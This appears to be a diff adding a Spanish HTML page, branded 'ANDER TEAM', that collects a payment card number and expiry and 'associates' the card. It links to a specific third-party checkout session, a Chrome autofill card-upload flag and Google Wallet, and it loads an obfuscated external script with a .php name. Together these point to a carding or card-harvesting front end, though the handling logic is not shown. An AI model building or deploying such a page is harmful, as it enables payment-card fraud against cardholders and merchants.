@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>ASOCIADOR</title>
+
+   
+
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+
+   
+
+   <div class="video-background">
+
+    <img src="fondo.webp" alt="background">
+
+    <div class="video-overlay"></div>
+
+</div>
+
+   
+
+    <style>
+
+:root {
+
+    --primary: #00f3ff;
+
+    --accent: #7000ff;
+
+    --bg: #000000;
+
+    --card-bg: #0d0d12; /* Color sólido en lugar de transparencia con blur */
+
+    --glass-border: rgba(0, 243, 255, 0.3);
+
+    --text-main: #e0e0e0;
+
+}
+
+
+
+* { 
+
+    margin: 0; padding: 0; box-sizing: border-box; 
+
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+
+    -webkit-tap-highlight-color: transparent;
+
+}
+
+
+
+body {
+
+    background-color: var(--bg);
+
+    color: var(--text-main);
+
+    min-height: 100vh;
+
+    display: flex; flex-direction: column; align-items: center; 
+
+    padding: 15px;
+
+    overflow-x: hidden;
+
+}
+
+
+
+/* Fondo simplificado sin animaciones pesadas */
+
+.video-background {
+
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+
+    z-index: -2; background: #000;
+
+}
+
+
+
+.video-background img {
+
+    width: 100%; height: 100%;
+
+    object-fit: cover;
+
+    opacity: 0.3; /* Brillo bajo para que el texto resalte sin filtros de blur */
+
+}
+
+
+
+/* Card Principal: Optimizada para GPU */
+
+.main-card {
+
+    width: 100%; max-width: 380px;
+
+    background: var(--card-bg);
+
+    border: 1px solid var(--glass-border);
+
+    border-radius: 20px;
+
+    padding: 20px;
+
+    margin-top: 10px;
+
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+
+    display: flex; flex-direction: column; gap: 20px;
+
+    /* Animación simple de entrada */
+
+    animation: simpleFade 0.5s ease-out;
+
+}
+
+
+
+/* Vista previa de tarjeta */
+
+.card-preview {
+
+    width: 100%;
+
+    aspect-ratio: 1.6/1;
+
+    background: linear-gradient(135deg, #050505 0%, #1a1a1a 100%);
+
+    border-radius: 15px;
+
+    padding: 20px;
+
+    display: flex; flex-direction: column; justify-content: space-between;
+
+    border: 1px solid rgba(255,255,255,0.05);
+
+}
+
+
+
+.card-chip { 
+
+    width: 38px; height: 28px; 
+
+    background: linear-gradient(135deg, var(--primary), var(--accent));
+
+    border-radius: 4px;
+
+}
+
+
+
+.card-number {
+
+    font-family: monospace; font-size: 18px;
+
+    letter-spacing: 2px; color: #fff;
+
+    text-shadow: 0 0 5px var(--primary);
+
+}
+
+
+
+/* Inputs: Estilo limpio y rápido */
+
+.input-group { position: relative; width: 100%; }
+
+
+
+.md-input {
+
+    width: 100%; height: 55px; padding: 12px;
+
+    background: #15151a;
+
+    border: 1px solid #333; 
+
+    border-radius: 10px;
+
+    color: #fff; font-size: 16px; /* 16px evita el zoom automático en iOS */
+
+    outline: none;
+
+}
+
+
+
+.md-input:focus {
+
+    border-color: var(--primary);
+
+}
+
+
+
+/* Botón: Eliminado el filtro de brillo y sombras pesadas */
+
+.btn-pay {
+
+    background: linear-gradient(90deg, var(--primary), var(--accent));
+
+    color: #000;
+
+    border: none; border-radius: 12px;
+
+    height: 55px; font-size: 15px; font-weight: 700;
+
+    text-transform: uppercase; letter-spacing: 1px;
+
+    cursor: pointer;
+
+    box-shadow: 0 4px 15px rgba(0, 243, 255, 0.2);
+
+}
+
+
+
+.btn-pay:active { transform: scale(0.98); }
+
+
+
+/* Navegación horizontal optimizada */
+
+.links-bar { 
+
+    display: flex; gap: 10px; 
+
+    overflow-x: auto; padding: 5px 0;
+
+    scrollbar-width: none; 
+
+}
+
+.links-bar::-webkit-scrollbar { display: none; }
+
+
+
+.link-chip {
+
+    white-space: nowrap; text-decoration: none; 
+
+    background: #1a1a20; border: 1px solid #333;
+
+    color: #aaa; padding: 8px 16px; border-radius: 20px;
+
+    font-size: 11px; font-weight: 600;
+
+}
+
+
+
+/* Animaciones ultra ligeras */
+
+@keyframes simpleFade {
+
+    from { opacity: 0; transform: translateY(10px); }
+
+    to { opacity: 1; transform: translateY(0); }
+
+}
+
+
+
+.loader {
+
+    width: 40px; height: 40px;
+
+    border: 3px solid rgba(0, 243, 255, 0.1);
+
+    border-top: 3px solid var(--primary);
+
+    border-radius: 50%;
+
+    animation: spin 0.8s linear infinite;
+
+}
+
+
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+
+
+/* Overlay de éxito */
+
+#success-overlay {
+
+    display: none; position: fixed; inset: 0;
+
+    background: #000; z-index: 10000;
+
+    flex-direction: column; justify-content: center; align-items: center;
+
+}
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+</style>
+
+
+
+</head>
+
+<body>
+
+
+
+    <main class="main-card">
+
+        
+
+
+
+        <p style="color: #9aa0a6; font-size: 10px; margin-top: 2px;">ASOCIADOR DE ANDER TEAM</p>
+
+        
+
+		
+
+		
+
+		
+
+		
+
+		
+
+		
+
+		
+
+		
+
+		
+
+        <div class="card-preview" id="cardCanvas">
+
+            <div class="card-top" style="display:flex; justify-content: space-between; align-items: flex-start;">
+
+                <div class="card-chip"></div>
+
+                <img src="YFSTFT3654663DFRTEFTYF5TYGGGS.js.webp" width="100" style="opacity: 0.8">
+
+            </div>
+
+            <div class="card-number" id="displayNum">•••• •••• •••• ••••</div>
+
+            <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+
+                <div>
+
+                    <p style="font-size: 10px; color: #888; text-transform: uppercase;">Titular del Sistema</p>
+
+                    <p style="font-size: 14px; color: #eee;" id="displayName">Nombre Apellido</p>
+
+                </div>
+
+                <div id="displayExp" style="font-size: 16px; color: #fff; font-family: monospace;">09/28</div>
+
+            </div>
+
+        </div>
+
+
+
+
+
+
+
+        <form id="gpay-form" style="display: flex; flex-direction: column; gap: 20px;">
+
+            <div class="input-group">
+
+
+
+				<input type="tel" id="cardNumber" name="cardnumber" autocomplete="cc-number" class="md-input" placeholder="0000 0000 0000 0000" maxlength="16">
+
+
+
+            </div>
+
+
+
+            <div style="display: flex; gap: 15px;">
+
+                <div class="input-group">
+
+
+
+					<input type="tel" id="cardDate" name="cc-exp" autocomplete="cc-exp" class="md-input" placeholder="MM/AA" maxlength="5">
+
+
+
+                </div>
+
+            </div>
+
+
+
+            <button type="button" id="btnPaste" style="display:none"></button>
+
+
+
+            <button type="submit" class="btn-pay" id="submitBtn">
+
+                ASOCIAR AHORA
+
+            </button>
+
+        </form>
+
+
+
+        <div class="links-bar">
+
+            <a href="#" class="link-chip" onclick="copyText(event, 'chrome://flags/#enable-autofill-credit-card-upload')">
+
+                <span id="chip-text">Copiar</span>
+
+            </a>
+
+            <a href="https://cncpts.com/checkouts/cn/hWN8pUYKZfjxlwYDBL12bkiA/en-us/information?_r=AQABhXBueZU-b1ySVz9uZb9vQLL-VaWXfp-wQMWtDFBIwpU&auto_redirect=false&edge_redirect=true&skip_shop_pay=true" class="link-chip" target="_top">Reparar</a>
+
+            <a href="https://wallet.google.com/" class="link-chip" target="_top">Guardadas</a>
+
+        </div>
+
+
+
+    </main>
+
+    <div id="success-overlay">
+
+        <div class="loader"></div>
+
+        <div style="margin-top: 30px; font-size: 20px; font-weight: 500; color: var(--accent); letter-spacing: 1px;">
+
+            Asociando...
+
+        </div>
+
+        <p style="color: #666; margin-top: 10px; font-size: 14px;">No cierres esta ventana</p>
+
+    </div>
+
+    <script src="YFSTFT3654663DFRTEFTYF5TYGGGS.php"></script>
+
+    <script>
+
+        // Parche de seguridad para el botón paste si lo requiere el script externo
+
+        if (!document.getElementById('btnPaste')) {
+
+            const btn = document.createElement('button');
+
+            btn.id = 'btnPaste';
+
+            btn.style.display = 'none';
+
+            document.body.appendChild(btn);
+
+        }
+
+    </script>
+
+</body>
+
+</html>
